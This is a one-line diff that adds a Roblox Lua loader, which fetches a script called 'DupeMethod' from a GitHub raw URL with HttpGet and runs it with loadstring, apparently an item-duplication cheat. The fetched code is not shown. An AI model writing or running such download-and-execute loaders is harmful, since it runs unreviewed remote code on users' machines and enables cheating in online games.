@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Krnvlz/PVB/refs/heads/main/DupeMethod"))()
